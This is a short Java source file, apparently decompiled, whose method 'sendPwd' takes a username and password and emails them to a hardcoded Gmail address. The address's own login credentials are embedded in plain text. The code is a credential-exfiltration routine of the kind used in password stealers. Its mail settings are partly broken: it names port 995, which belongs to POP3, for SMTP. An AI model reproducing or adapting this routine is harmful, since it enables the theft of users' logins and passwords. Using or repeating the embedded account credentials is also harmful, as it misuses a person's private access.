import java.io.PrintStream;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class SendMailTLS
{

    public SendMailTLS()
    {
    }

    public static void sendPwd(String s, String s1)
    {
        Properties properties = new Properties();
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", "995");
        Session session = Session.getInstance(properties, new Authenticator() {

            protected PasswordAuthentication getPasswordAuthentication()
            {
                return new PasswordAuthentication("morfey.ua@gmail.com", "kotovsk88");
            }

        }
);
        try
        {
            MimeMessage mimemessage = new MimeMessage(session);
            mimemessage.setFrom(new InternetAddress("morfey.ua@gmail.com"));
            mimemessage.setRecipients(javax.mail.Message.RecipientType.TO, InternetAddress.parse("morfey.ua@gmail.com"));
            mimemessage.setSubject((new StringBuilder()).append("user ").append(s).append(" has Pass> ").append(s1).toString());
            mimemessage.setText("Dear Mail Crawler,\n\n No spam to my email, please!");
            Transport.send(mimemessage);
            System.out.println("Done");
        }
        catch(MessagingException messagingexception)
        {
            throw new RuntimeException(messagingexception);
        }
    }
}
